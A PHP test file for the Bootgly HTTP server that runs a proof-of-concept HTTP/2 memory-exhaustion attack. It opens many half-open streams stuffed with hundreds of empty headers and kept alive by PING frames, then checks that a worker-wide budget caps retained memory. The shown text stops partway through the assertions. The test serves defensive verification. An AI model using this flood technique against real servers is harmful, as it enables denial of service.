<?php

use Bootgly\ABI\Debugging\Data\Vars;
use Bootgly\ACI\Events\Timer;
use Bootgly\ACI\Tests\Suite\Test\Specification\Separator;
use Bootgly\WPI\Interfaces\TCP_Server_CLI;
use Bootgly\WPI\Interfaces\TCP_Server_CLI\Connections;
use Bootgly\WPI\Modules\HTTP2;
use Bootgly\WPI\Modules\HTTP2\Errors;
use Bootgly\WPI\Modules\HTTP2\Frame;
use Bootgly\WPI\Modules\HTTP2\HPACK;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Decoders\Decoder_HTTP2;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Request;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Response;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Router;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Tests\Suite\Test\Specification;


/**
 * Security PoC H3 — decoded HTTP/2 request heads retained while END_STREAM is
 * withheld must share an explicit worker-wide budget.
 *
 * The attack uses four real h2c connections and the advertised maximum of 128
 * concurrent streams on each. Every stream carries 448 distinct empty regular
 * fields: the decoded list is 16,373 bytes, below the 16,384-byte per-list cap,
 * while its context-free HPACK block is only 3,193 bytes. END_STREAM is omitted.
 *
 * Worker-side, token-gated snapshots prove the exact persistent Stream state,
 * relevant ledgers, PHP heap growth, PING-backed connection activity, cleanup,
 * and same-worker survival. A separately valid one-stream near-limit control
 * and a 449-field over-limit rejection control prevent a codec or bootstrap
 * failure from being mislabeled as H3.
 */
$connectionCount = 4;
$streamsPerConnection = 128;
$fieldsPerStream = 448;
$targetStreams = $connectionCount * $streamsPerConnection;
$targetFields = $targetStreams * $fieldsPerStream;
$workerCap = 256 * 1024;
$heapFloor = 8 * 1024 * 1024;
$probe = [
   'error' => '',
   'token' => '',
   'list_bytes' => 0,
   'wire_bytes' => 0,
   'over_list_bytes' => 0,
   'setup' => [],
   'simple' => [],
   'near' => [],
   'near_snapshot' => [],
   'near_release' => [],
   'over' => [],
   'over_snapshot' => [],
   'attack_ports' => [],
   'register' => [],
   'preface_acks' => 0,
   'baseline' => [],
   'attack_frames_written' => 0,
   'attack_bytes_written' => 0,
   'attack_short_writes' => 0,
   'first_ping_acks' => 0,
   'first_ping_ports' => [],
   'sustain_ping_acks' => 0,
   'pressure_goaway_ports' => [],
   'sustain_elapsed_ms' => 0.0,
   'attack_resets' => [],
   'attack_goaways' => [],
   'retained' => [],
   'persistent' => [],
   'cleanup' => [],
   'fresh' => [],
];
$worker = [
   'token' => '',
   'original_cap' => null,
   'timer' => false,
   'cleaned' => false,
   'ports' => [],
];

return new Specification(
   description: 'Half-open HTTP/2 request heads must share a worker-wide retained-memory budget',
   Separator: new Separator(line: true),

   request: static function (
      string $hostPort,
      int $testIndex,
   ) use (
      &$probe,
      $connectionCount,
      $streamsPerConnection,
      $fieldsPerStream,
      $workerCap,
   ): string {
      $token = bin2hex(random_bytes(8));
      $probe['token'] = $token;

      $Fields = static function (
         string $token,
         int $count,
         string $path = '/h3-head-hold',
      ): array {
         $fields = [
            [':method', 'POST'],
            [':scheme', 'http'],
            [':path', $path],
            [':authority', 'localhost'],
            ['x-h3-token', $token],
         ];
         for ($index = 0; $index < $count; $index++) {
            $fields[] = [sprintf('x%03d', $index), ''];
         }

         return $fields;
      };

      $Measure = static function (array $fields): int {
         $bytes = 0;
         foreach ($fields as [$name, $value]) {
            $bytes += strlen($name) + strlen($value) + 32;
         }

         return $bytes;
      };

      $Write = static function ($Socket, string $wire): void {
         $offset = 0;
         $length = strlen($wire);
         while ($offset < $length) {
            $written = @fwrite($Socket, substr($wire, $offset));
            if ($written === false || $written === 0) {
               throw new RuntimeException(
                  "Short HTTP/2 fixture write at {$offset}/{$length} bytes."
               );
            }
            $offset += $written;
         }
      };

      $Push = static function ($Socket, string $wire): array {
         $offset = 0;
         $length = strlen($wire);
         while ($offset < $length) {
            $written = @fwrite($Socket, substr($wire, $offset));
            if ($written === false || $written === 0) {
               break;
            }
            $offset += $written;
         }

         return [
            'bytes' => $offset,
            'complete' => $offset === $length,
         ];
      };

      $Read = static function ($Socket, float $seconds): string {
         stream_set_blocking($Socket, false);
         $wire = '';
         $deadline = microtime(true) + $seconds;
         while (microtime(true) < $deadline) {
            $chunk = @fread($Socket, 65535);
            if ($chunk !== false && $chunk !== '') {
               $wire .= $chunk;
               continue;
            }
            if (@feof($Socket)) {
               break;
            }
            usleep(5_000);
         }

         return $wire;
      };

      $Walk = static function (string $wire): array {
         $state = [
            'frames' => 0,
            'settings_acks' => 0,
            'headers' => 0,
            'data' => 0,
            'data_payload' => '',
            'ended' => [],
            'pings' => [],
            'resets' => [],
            'goaways' => [],
            'parsed' => 0,
            'wire_bytes' => strlen($wire),
         ];
         $offset = 0;
         $length = strlen($wire);
         while ($offset + 9 <= $length) {
            $head = substr($wire, $offset, 9);
            $size = (ord($head[0]) << 16)
               | (ord($head[1]) << 8)
               | ord($head[2]);
            if ($size > 0x1000000 || $offset + 9 + $size > $length) {
               break;
            }

            $type = ord($head[3]);
            $flags = ord($head[4]);
            /** @var array{1:int} $StreamID */
            $StreamID = unpack('N', substr($head, 5, 4));
            $streamID = $StreamID[1] & 0x7fffffff;
            $payload = substr($wire, $offset + 9, $size);
            $state['frames']++;

            if (
               $type === HTTP2::FRAME_SETTINGS
               && ($flags & HTTP2::FLAG_ACK) !== 0
            ) {
               $state['settings_acks']++;
            }
            else if ($type === HTTP2::FRAME_HEADERS) {
               $state['headers']++;
            }
            else if ($type === HTTP2::FRAME_DATA) {
               $state['data'] += $size;
               $state['data_payload'] .= $payload;
               if (($flags & HTTP2::FLAG_END_STREAM) !== 0) {
                  $state['ended'][] = $streamID;
               }
            }
            else if (
               $type === HTTP2::FRAME_PING
               && ($flags & HTTP2::FLAG_ACK) !== 0
               && $size === 8
            ) {
               $state['pings'][] = bin2hex($payload);
            }
            else if ($type === HTTP2::FRAME_RST_STREAM && $size >= 4) {
               /** @var array{1:int} $Error */
               $Error = unpack('N', substr($payload, 0, 4));
               $error = $Error[1];
               $state['resets'][$error] =
                  ($state['resets'][$error] ?? 0) + 1;
            }
            else if ($type === HTTP2::FRAME_GOAWAY && $size >= 8) {
               /** @var array{1:int,2:int} $Goaway */
               $Goaway = unpack('N2', substr($payload, 0, 8));
               $error = $Goaway[2];
               $state['goaways'][$error] =
                  ($state['goaways'][$error] ?? 0) + 1;
            }

            $offset += 9 + $size;
         }
         $state['parsed'] = $offset;

         return $state;
      };

      $Call = static function (
         string $hostPort,
         int $testIndex,
         string $path,
         string $token,
         float $seconds = 0.75,
         array $ports = [],
      ) use ($Read): array {
         $Socket = @stream_socket_client(
            "tcp://{$hostPort}",
            $errorNumber,
            $errorMessage,
            timeout: 3,
         );
         if (! is_resource($Socket)) {
            throw new RuntimeException(
               "Could not call {$path}: {$errorNumber} {$errorMessage}"
            );
         }

         stream_set_blocking($Socket, true);
         stream_set_timeout($Socket, 3);
         $request = "GET {$path} HTTP/1.1\r\n"
            . "X-Bootgly-Test: {$testIndex}\r\n"
            . "X-H3-Token: {$token}\r\n"
            . ($ports === []
               ? ''
               : 'X-H3-Ports: ' . implode(',', $ports) . "\r\n")
            . "Host: localhost\r\n"
            . "Connection: close\r\n\r\n";
         $written = @fwrite($Socket, $request);
         if ($written !== strlen($request)) {
            @fclose($Socket);
            throw new RuntimeException("Could not write the complete {$path} request.");
         }

         $wire = $Read($Socket, $seconds);
         @fclose($Socket);
         $separator = strpos($wire, "\r\n\r\n");
         if ($separator === false) {
            throw new RuntimeException("Route {$path} returned no HTTP response head.");
         }
         $decoded = json_decode(substr($wire, $separator + 4), true);
         if (! is_array($decoded)) {
            throw new RuntimeException("Route {$path} returned invalid JSON.");
         }

         return $decoded;
      };

      $Open = static function (string $hostPort) {
         $Socket = @stream_socket_client(
            "tcp://{$hostPort}",
            $errorNumber,
            $errorMessage,
            timeout: 3,
         );
         if (! is_resource($Socket)) {
            throw new RuntimeException(
               "Could not open HTTP/2 fixture: {$errorNumber} {$errorMessage}"
            );
         }
         stream_set_blocking($Socket, true);
         stream_set_timeout($Socket, 3);

         return $Socket;
      };

      $Preface = static function ($Socket) use ($Write, $Read, $Walk): array {
         $Write(
            $Socket,
            HTTP2::PREFACE . Frame::pack(HTTP2::FRAME_SETTINGS, 0, 0),
         );

         return $Walk($Read($Socket, 0.35));
      };

      $Port = static function ($Socket): int {
         $name = (string) @stream_socket_get_name($Socket, false);
         $separator = strrpos($name, ':');
         if ($separator === false) {
            return 0;
         }

         return (int) substr($name, $separator + 1);
      };

      $Merge = static function (array &$target, array $source): void {
         foreach ($source as $error => $count) {
            $target[$error] = ($target[$error] ?? 0) + $count;
         }
      };

      $Near = null;
      $Over = null;
      $Simple = null;
      $Attack = [];
      try {
         $nearFields = $Fields($token, $fieldsPerStream);
         $nearBlock = HPACK::encode($nearFields);
         $overFields = $Fields($token, $fieldsPerStream + 1);
         $overBlock = HPACK::encode($overFields);
         $probe['list_bytes'] = $Measure($nearFields);
         $probe['wire_bytes'] = strlen($nearBlock);
         $probe['over_list_bytes'] = $Measure($overFields);

         $probe['setup'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-setup',
            $token,
         );

         // # Positive control: ordinary bodyless h2 request dispatches.
         $Simple = $Open($hostPort);
         $simplePreface = $Preface($Simple);
         $simpleBlock = HPACK::encode([
            [':method', 'GET'],
            [':scheme', 'http'],
            [':path', '/h3-head-control'],
            [':authority', 'localhost'],
            ['x-bootgly-test', (string) $testIndex],
         ]);
         $Write($Simple, Frame::pack(
            HTTP2::FRAME_HEADERS,
            HTTP2::FLAG_END_HEADERS | HTTP2::FLAG_END_STREAM,
            1,
            $simpleBlock,
         ));
         $probe['simple'] = [
            'preface' => $simplePreface,
            ...$Walk($Read($Simple, 0.6)),
         ];
         @fclose($Simple);
         $Simple = null;

         // # Boundary control: exactly one valid near-limit half-open head.
         $Near = $Open($hostPort);
         $nearPreface = $Preface($Near);
         $Write($Near, Frame::pack(
            HTTP2::FRAME_HEADERS,
            HTTP2::FLAG_END_HEADERS,
            1,
            $nearBlock,
         ));
         $nearPing = 'nearh3ok';
         $Write($Near, Frame::pack(
            HTTP2::FRAME_PING,
            0,
            0,
            $nearPing,
         ));
         $probe['near'] = [
            'preface' => $nearPreface,
            ...$Walk($Read($Near, 0.5)),
         ];
         $probe['near_snapshot'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-snapshot',
            $token,
         );
         $Write($Near, Frame::pack(
            HTTP2::FRAME_RST_STREAM,
            0,
            1,
            pack('N', Errors::Cancel->value),
         ));
         @fclose($Near);
         $Near = null;
         for ($attempt = 0; $attempt < 10; $attempt++) {
            usleep(50_000);
            $probe['near_release'] = $Call(
               $hostPort,
               $testIndex,
               '/h3-head-snapshot',
               $token,
            );
            if (($probe['near_release']['tagged_streams'] ?? -1) === 0) {
               break;
            }
         }

         // # Boundary control: one additional 36-byte field exceeds the list cap.
         $Over = $Open($hostPort);
         $overPreface = $Preface($Over);
         $Write($Over, Frame::pack(
            HTTP2::FRAME_HEADERS,
            HTTP2::FLAG_END_HEADERS,
            1,
            $overBlock,
         ));
         $probe['over'] = [
            'preface' => $overPreface,
            ...$Walk($Read($Over, 0.6)),
         ];
         @fclose($Over);
         $Over = null;
         $probe['over_snapshot'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-snapshot',
            $token,
         );

         // # Open all attack connections before measuring the worker baseline.
         for ($connection = 0; $connection < $connectionCount; $connection++) {
            $Socket = $Open($hostPort);
            $Attack[] = $Socket;
            $probe['attack_ports'][] = $Port($Socket);
            $state = $Preface($Socket);
            $probe['preface_acks'] += $state['settings_acks'];
         }
         $probe['register'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-register',
            $token,
            ports: $probe['attack_ports'],
         );
         $probe['baseline'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-snapshot',
            $token,
         );

         $attackWire = '';
         for ($index = 0; $index < $streamsPerConnection; $index++) {
            $attackWire .= Frame::pack(
               HTTP2::FRAME_HEADERS,
               HTTP2::FLAG_END_HEADERS,
               2 * $index + 1,
               $nearBlock,
            );
         }
         foreach ($Attack as $Socket) {
            $pushed = $Push($Socket, $attackWire);
            $probe['attack_bytes_written'] += $pushed['bytes'];
            $probe['attack_frames_written'] += intdiv(
               $pushed['bytes'],
               9 + strlen($nearBlock),
            );
            if (! $pushed['complete']) {
               $probe['attack_short_writes']++;
            }
         }

         // # PING is both a synchronization barrier and connection-idle activity.
         usleep(100_000);
         foreach ($Attack as $index => $Socket) {
            $payload = sprintf('h3a%05d', $index);
            $Push($Socket, Frame::pack(
               HTTP2::FRAME_PING,
               0,
               0,
               $payload,
            ));
         }
         foreach ($Attack as $index => $Socket) {
            $state = $Walk($Read($Socket, 0.6));
            $payload = bin2hex(sprintf('h3a%05d', $index));
            if (in_array($payload, $state['pings'], true)) {
               $probe['first_ping_acks']++;
               $port = $probe['attack_ports'][$index] ?? 0;
               if ($port > 0) {
                  $probe['first_ping_ports'][$port] = true;
               }
            }
            foreach ($state['goaways'] as $error => $count) {
               if (
                  $count > 0
                  && (
                     (int) $error === Errors::EnhanceYourCalm->value
                     || (int) $error === Errors::RefusedStream->value
                  )
               ) {
                  $port = $probe['attack_ports'][$index] ?? 0;
                  if ($port > 0) {
                     $probe['pressure_goaway_ports'][$port] = true;
                  }
               }
            }
            $Merge($probe['attack_resets'], $state['resets']);
            $Merge($probe['attack_goaways'], $state['goaways']);
         }
         $probe['retained'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-snapshot',
            $token,
         );

         // # Sustain all connections beyond their natural 15-second idle
         //   expiration. The worker's own timer, not test introspection, must
         //   consume these ACK writes and refresh Connection::$used.
         $sustainStarted = hrtime(true);
         for ($round = 0; $round < 4; $round++) {
            $roundDeadline = hrtime(true) + 4_000_000_000;
            while (($remainingNS = $roundDeadline - hrtime(true)) > 0) {
               usleep((int) min(500_000, ceil($remainingNS / 1_000)));
            }
            foreach ($Attack as $index => $Socket) {
               $payload = sprintf('s%02d%05d', $round, $index);
               $Push($Socket, Frame::pack(
                  HTTP2::FRAME_PING,
                  0,
                  0,
                  $payload,
               ));
            }
            foreach ($Attack as $index => $Socket) {
               $state = $Walk($Read($Socket, 0.25));
               $payload = bin2hex(sprintf('s%02d%05d', $round, $index));
               if (in_array($payload, $state['pings'], true)) {
                  $probe['sustain_ping_acks']++;
               }
               foreach ($state['goaways'] as $error => $count) {
                  if (
                     $count > 0
                     && (
                        (int) $error === Errors::EnhanceYourCalm->value
                        || (int) $error === Errors::RefusedStream->value
                     )
                  ) {
                     $port = $probe['attack_ports'][$index] ?? 0;
                     if ($port > 0) {
                        $probe['pressure_goaway_ports'][$port] = true;
                     }
                  }
               }
               $Merge($probe['attack_resets'], $state['resets']);
               $Merge($probe['attack_goaways'], $state['goaways']);
            }
         }
         $probe['sustain_elapsed_ms'] =
            (hrtime(true) - $sustainStarted) / 1_000_000;
         $probe['persistent'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-snapshot',
            $token,
         );

         $probe['cleanup'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-cleanup',
            $token,
         );
         $probe['fresh'] = $Call(
            $hostPort,
            $testIndex,
            '/h3-head-fresh',
            $token,
         );
      }
      catch (Throwable $Throwable) {
         $probe['error'] = $Throwable::class . ': ' . $Throwable->getMessage();
      }
      finally {
         foreach ([$Near, $Over, $Simple, ...$Attack] as $Socket) {
            if (is_resource($Socket)) {
               @fclose($Socket);
            }
         }

         if (($probe['cleanup']['phase'] ?? '') !== 'cleanup') {
            try {
               $probe['cleanup'] = $Call(
                  $hostPort,
                  $testIndex,
                  '/h3-head-cleanup',
                  $token,
               );
            }
            catch (Throwable $Throwable) {
               $probe['error'] .= ($probe['error'] === '' ? '' : ' | ')
                  . 'cleanup: ' . $Throwable::class . ': '
                  . $Throwable->getMessage();
            }
         }
      }

      return "GET /h3-head-harness HTTP/1.1\r\n"
         . "X-Bootgly-Test: {$testIndex}\r\n"
         . "X-H3-Token: {$token}\r\n"
         . "Host: localhost\r\n"
         . "Connection: close\r\n\r\n";
   },

   response: static function (
      Request $Request,
      Response $Response,
      Router $Router,
   ) use (
      &$worker,
      $workerCap,
      $connectionCount,
   ) {
      $Snapshot = static function (string $token): array {
         $taggedConnections = 0;
         $taggedStreams = 0;
         $controlledFields = 0;
         $decodedListBytes = 0;
         $headStringBytes = 0;
         $bodyBytes = 0;
         $bodyLedger = 0;
         $decoderLedger = 0;
         $streamLedger = 0;
         $headLedger = 0;
         $H2 = [];

         foreach (Connections::$Connections as $Connection) {
            $Decoder = $Connection->Decoder;
            if (! $Decoder instanceof Decoder_HTTP2) {
               continue;
            }
            $connectionStreams = 0;
            $connectionFields = 0;
            $connectionListBytes = 0;
            foreach ($Decoder->Streams as $Stream) {
               if (($Stream->fields['x-h3-token'] ?? null) !== $token) {
                  continue;
               }

               $connectionStreams++;
               $taggedStreams++;
               $bodyBytes += strlen($Stream->body);
               $streamLedger += $Stream->Buffers->retained;
               $headLedger += $Stream->HeadBuffers->retained;

               $listBytes = strlen(':method') + strlen($Stream->method) + 32
                  + strlen(':scheme') + strlen($Stream->scheme) + 32
                  + strlen(':path') + strlen($Stream->target) + 32
                  + strlen(':authority') + strlen($Stream->authority) + 32;
               $headStringBytes += strlen($Stream->method)
                  + strlen($Stream->scheme)
                  + strlen($Stream->target)
                  + strlen($Stream->authority);

               foreach ($Stream->fields as $name => $value) {
                  // `host` is synthesized from :authority after HPACK decoding.
                  if ($name === 'host') {
                     continue;
                  }
                  $Values = is_array($value) ? $value : [$value];
                  foreach ($Values as $fieldValue) {
                     $listBytes += strlen($name) + strlen($fieldValue) + 32;
                     $headStringBytes += strlen($name) + strlen($fieldValue);
                     if (preg_match('/^x[0-9]{3}$/D', $name) === 1) {
                        $connectionFields++;
                        $controlledFields++;
                     }
                  }
               }

               $connectionListBytes += $listBytes;
               $decodedListBytes += $listBytes;
            }

            if ($connectionStreams > 0) {
               $taggedConnections++;
               $bodyLedger += $Decoder->Bodies->retained;
               $decoderLedger += $Decoder->Buffers->retained;
            }
            $H2[(string) $Connection->id] = [
               'id' => $Connection->id,
               'port' => $Connection->port,
               'writes' => $Connection->writes,
               'used' => $Connection->used,
               'tagged_streams' => $connectionStreams,
               'controlled_fields' => $connectionFields,
               'decoded_list_bytes' => $connectionListBytes,
            ];
         }

         gc_collect_cycles();

         return [
            'phase' => 'snapshot',
            'pid' => getmypid(),
            'cap' => TCP_Server_CLI::$maxWorkerPendingBytes,
            'pending' => TCP_Server_CLI::$pendingBytes,
            'heap' => memory_get_usage(false),
            'tagged_connections' => $taggedConnections,
            'tagged_streams' => $taggedStreams,
            'controlled_fields' => $controlledFields,
            'decoded_list_bytes' => $decodedListBytes,
            'head_string_bytes' => $headStringBytes,
            'body_bytes' => $bodyBytes,
            'body_ledger' => $bodyLedger,
            'decoder_ledger' => $decoderLedger,
            'stream_ledger' => $streamLedger,
            'head_ledger' => $headLedger,
            'h2' => $H2,
         ];
      };

      $Cleanup = static function () use (&$worker, $Snapshot): array {
         $token = $worker['token'];
         $registered = count($worker['ports']);
         if ($worker['cleaned']) {
            $snapshot = $Snapshot($token);
            $ports = array_flip($worker['ports']);
            $remaining = 0;
            foreach ($snapshot['h2'] as $connection) {
               if (isSet($ports[$connection['port'] ?? 0])) {
                  $remaining++;
               }
            }

            return [
               ...$snapshot,
               'phase' => 'cleanup',
               'pid' => getmypid(),
               'closed' => 0,
               'registered_ports' => $registered,
               'remaining_registered' => $remaining,
               'errors' => [],
               'restored_cap' => TCP_Server_CLI::$maxWorkerPendingBytes,
               'complete' => ($snapshot['tagged_streams'] ?? -1) === 0
                  && ($snapshot['pending'] ?? -1) === 0
                  && $remaining === 0,
            ];
         }

         $Connections = [];
         $ports = array_flip($worker['ports']);
         if ($token !== '') {
            foreach (Connections::$Connections as $Connection) {
               $Decoder = $Connection->Decoder;
               if (! $Decoder instanceof Decoder_HTTP2) {
                  continue;
               }
               if (isSet($ports[$Connection->port])) {
                  $Connections[$Connection->id] = $Connection;
                  continue;
               }
               foreach ($Decoder->Streams as $Stream) {
                  if (
                     ($Stream->fields['x-h3-token'] ?? null)
                     === $token
                  ) {
                     $Connections[$Connection->id] = $Connection;
                     break;
                  }
               }
            }
         }

         $closed = 0;
         $errors = [];
         foreach ($Connections as $Connection) {
            try {
               $Connection->close();
               $closed++;
            }
            catch (Throwable $Throwable) {
               $errors[] = $Throwable::class . ': ' . $Throwable->getMessage();
            }
         }
         // Restoration is independent of connection cleanup success.
         if (is_int($worker['original_cap'])) {
            TCP_Server_CLI::$maxWorkerPendingBytes = $worker['original_cap'];
         }
         gc_collect_cycles();
         $snapshot = $Snapshot($token);
         $remaining = 0;
         foreach ($snapshot['h2'] as $connection) {
            if (isSet($ports[$connection['port'] ?? 0])) {
               $remaining++;
            }
         }

         $complete = $errors === []
            && ($snapshot['tagged_streams'] ?? -1) === 0
            && ($snapshot['pending'] ?? -1) === 0
            && $remaining === 0;
         $result = [
            ...$snapshot,
            'phase' => 'cleanup',
            'pid' => getmypid(),
            'closed' => $closed,
            'registered_ports' => $registered,
            'remaining_registered' => $remaining,
            'errors' => $errors,
            'restored_cap' => TCP_Server_CLI::$maxWorkerPendingBytes,
            'complete' => $complete,
         ];
         if ($complete) {
            $worker['cleaned'] = true;
            $timer = $worker['timer'];
            $worker['timer'] = false;
            if (is_int($timer) && $timer > 0) {
               Timer::del($timer);
            }
            $worker['token'] = '';
            $worker['ports'] = [];
            $worker['original_cap'] = null;
         }

         return $result;
      };

      yield $Router->route('/h3-head-setup', static function (
         Request $Request,
         Response $Response,
      ) use (&$worker, $workerCap, $Cleanup): Response {
         $token = $Request->Header->get('X-H3-Token') ?? '';
         if (preg_match('/^[a-f0-9]{16}$/D', $token) !== 1) {
            return $Response->code(400)->JSON->send([
               'phase' => 'setup',
               'error' => 'invalid token',
            ]);
         }

         $worker['token'] = $token;
         $worker['original_cap'] = TCP_Server_CLI::$maxWorkerPendingBytes;
         $worker['cleaned'] = false;
         $worker['ports'] = [];
         TCP_Server_CLI::$maxWorkerPendingBytes = $workerCap;
         $worker['timer'] = Timer::add(60, $Cleanup, persistent: false);

         return $Response->JSON->send([
            'phase' => 'setup',
            'pid' => getmypid(),
            'cap' => TCP_Server_CLI::$maxWorkerPendingBytes,
            'original_cap' => $worker['original_cap'],
            'timer' => $worker['timer'],
         ]);
      }, GET);

      yield $Router->route('/h3-head-register', static function (
         Request $Request,
         Response $Response,
      ) use (&$worker, $connectionCount): Response {
         $token = $Request->Header->get('X-H3-Token') ?? '';
         $raw = $Request->Header->get('X-H3-Ports') ?? '';
         $parts = $raw === '' ? [] : explode(',', $raw);
         $ports = [];
         foreach ($parts as $part) {
            if (preg_match('/^[0-9]{1,5}$/D', $part) !== 1) {
               $ports = [];
               break;
            }
            $port = (int) $part;
            if ($port < 1 || $port > 65535) {
               $ports = [];
               break;
            }
            $ports[$port] = $port;
         }
         if (
            $token === ''
            || $worker['token'] === ''
            || ! hash_equals($worker['token'], $token)
            || count($ports) !== $connectionCount
         ) {
            return $Response->code(400)->JSON->send([
               'phase' => 'register',
               'error' => 'invalid token or ports',
            ]);
         }

         $worker['ports'] = array_values($ports);

         return $Response->JSON->send([
            'phase' => 'register',
            'pid' => getmypid(),
            'ports' => $worker['ports'],
         ]);
      }, GET);

      yield $Router->route('/h3-head-snapshot', static function (
         Request $Request,
         Response $Response,
      ) use (&$worker, $Snapshot): Response {
         $token = $Request->Header->get('X-H3-Token') ?? '';
         if (
            $token === ''
            || $worker['token'] === ''
            || ! hash_equals($worker['token'], $token)
         ) {
            return $Response->code(403)->JSON->send([
               'phase' => 'snapshot',
               'error' => 'invalid token',
            ]);
         }

         return $Response->JSON->send($Snapshot($token));
      }, GET);

      yield $Router->route('/h3-head-cleanup', static function (
         Request $Request,
         Response $Response,
      ) use (&$worker, $Cleanup): Response {
         $token = $Request->Header->get('X-H3-Token') ?? '';
         if (
            $token === ''
            || $worker['token'] === ''
            || ! hash_equals($worker['token'], $token)
         ) {
            return $Response->code(403)->JSON->send([
               'phase' => 'cleanup',
               'error' => 'invalid token',
            ]);
         }

         return $Response->JSON->send($Cleanup());
      }, GET);

      yield $Router->route('/h3-head-control', static function (
         Request $Request,
         Response $Response,
      ): Response {
         return $Response->JSON->send([
            'phase' => 'control',
            'pid' => getmypid(),
         ]);
      }, GET);

      yield $Router->route('/h3-head-fresh', static function (
         Request $Request,
         Response $Response,
      ): Response {
         return $Response->JSON->send([
            'phase' => 'fresh',
            'pid' => getmypid(),
         ]);
      }, GET);

      yield $Router->route('/h3-head-harness', static function (
         Request $Request,
         Response $Response,
      ): Response {
         return $Response->JSON->send([
            'phase' => 'harness',
            'pid' => getmypid(),
         ]);
      }, GET);
   },

   test: static function (string $response) use (
      &$probe,
      $connectionCount,
      $streamsPerConnection,
      $fieldsPerStream,
      $targetStreams,
      $targetFields,
      $workerCap,
      $heapFloor,
   ): bool|string {
      $separator = strpos($response, "\r\n\r\n");
      $harness = $separator === false
         ? null
         : json_decode(substr($response, $separator + 4), true);

      if ($probe['error'] !== '') {
         Vars::$labels = ['H3 fixture evidence'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H3 fixture error: ' . $probe['error'];
      }

      $PID = $probe['setup']['pid'] ?? 0;
      $freshPID = $probe['fresh']['pid'] ?? 0;
      $cleanupPID = $probe['cleanup']['pid'] ?? 0;
      $harnessPID = is_array($harness) ? ($harness['pid'] ?? 0) : 0;
      if (
         ! is_int($PID)
         || $PID <= 0
         || ($probe['setup']['cap'] ?? -1) !== $workerCap
         || ($probe['setup']['timer'] ?? false) === false
         || ($probe['register']['phase'] ?? '') !== 'register'
         || ($probe['register']['pid'] ?? 0) !== $PID
         || count($probe['register']['ports'] ?? []) !== $connectionCount
         || ! is_int($freshPID)
         || $freshPID !== $PID
         || ! is_int($cleanupPID)
         || $cleanupPID !== $PID
         || ! is_int($harnessPID)
         || $harnessPID !== $PID
         || ($probe['cleanup']['complete'] ?? false) !== true
         || ($probe['cleanup']['errors'] ?? null) !== []
         || ($probe['cleanup']['tagged_streams'] ?? -1) !== 0
         || ($probe['cleanup']['pending'] ?? -1) !== 0
         || ($probe['cleanup']['registered_ports'] ?? -1) !== $connectionCount
         || ($probe['cleanup']['remaining_registered'] ?? -1) !== 0
         || ($probe['cleanup']['restored_cap'] ?? -1)
            !== ($probe['setup']['original_cap'] ?? -2)
      ) {
         Vars::$labels = ['H3 worker and cleanup controls'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H3 control failed: setup, cleanup, fresh request, and harness '
            . 'did not complete in one healthy worker with exact ledger release. '
            . (string) json_encode([
               'setup' => $probe['setup'],
               'cleanup' => $probe['cleanup'],
               'fresh' => $probe['fresh'],
               'harness' => $harness,
            ], JSON_UNESCAPED_SLASHES);
      }

      $simple = $probe['simple'];
      $simpleControl = json_decode($simple['data_payload'] ?? '', true);
      $near = $probe['near'];
      $over = $probe['over'];
      $nearPending = $probe['near_snapshot']['pending'] ?? -1;
      $nearHeadLedger = $probe['near_snapshot']['head_ledger'] ?? -1;
      $nearCharge = 2 * 16373 + ($fieldsPerStream + 5) * 384 + 1024;
      $nearAccounting =
         ($nearPending === 0 && $nearHeadLedger === 0)
         || (
            $nearPending === $nearCharge
            && $nearHeadLedger === $nearCharge
            && $nearPending <= $workerCap
         );
      if (
         ($simple['preface']['settings_acks'] ?? 0) !== 1
         || ($simple['headers'] ?? 0) < 1
         || ($simple['data'] ?? 0) <= 0
         || ! in_array(1, $simple['ended'] ?? [], true)
         || ! is_array($simpleControl)
         || ($simpleControl['phase'] ?? '') !== 'control'
         || ($simpleControl['pid'] ?? 0) !== $PID
         || ($simple['resets'] ?? null) !== []
         || ($simple['goaways'] ?? null) !== []
         || ($probe['list_bytes'] ?? 0) !== 16373
         || ($probe['wire_bytes'] ?? 0) !== 3193
         || ($near['preface']['settings_acks'] ?? 0) !== 1
         || ! in_array(bin2hex('nearh3ok'), $near['pings'] ?? [], true)
         || ($near['resets'] ?? null) !== []
         || ($near['goaways'] ?? null) !== []
         || ($probe['near_snapshot']['pid'] ?? 0) !== $PID
         || ($probe['near_snapshot']['tagged_connections'] ?? -1) !== 1
         || ($probe['near_snapshot']['tagged_streams'] ?? -1) !== 1
         || ($probe['near_snapshot']['controlled_fields'] ?? -1)
            !== $fieldsPerStream
         || ($probe['near_snapshot']['decoded_list_bytes'] ?? -1) !== 16373
         || $nearAccounting === false
         || ($probe['near_snapshot']['body_ledger'] ?? -1) !== 0
         || ($probe['near_release']['tagged_streams'] ?? -1) !== 0
         || ($probe['near_release']['pending'] ?? -1) !== 0
         || ($probe['over_list_bytes'] ?? 0) !== 16409
         || ($over['preface']['settings_acks'] ?? 0) !== 1
         || ($over['goaways'][Errors::Compression->value] ?? 0) < 1
         || ($probe['over_snapshot']['tagged_streams'] ?? -1) !== 0
      ) {
         Vars::$labels = ['H3 protocol boundary controls'];
         dump(json_encode($probe, JSON_UNESCAPED_SLASHES));

         return 'H3 control failed: ordinary h2 dispatch, the valid 16,373-byte '
            . 'head, or the invalid 16,409-byte list boundary was not exercised.';
      }

      $baseline = $probe['baseline'];
      $retained = $probe['retained'];
      $persistent = $probe['persistent'];
      $expectedListBytes = 16373 * $targetStreams;
      $heapGrowth = ($retained['heap'] ?? 0) - ($baseline['heap'] ?? 0);
      $persistentHeapGrowth =
         ($persistent['heap'] ?? 0) - ($baseline['heap'] ?? 0);
      $expectedAttackBytes =
         $connectionCount * $streamsPerConnection * (9 + 3193);
      $barrierPorts = $probe['first_ping_ports']
         + $probe['pressure_goaway_ports'];
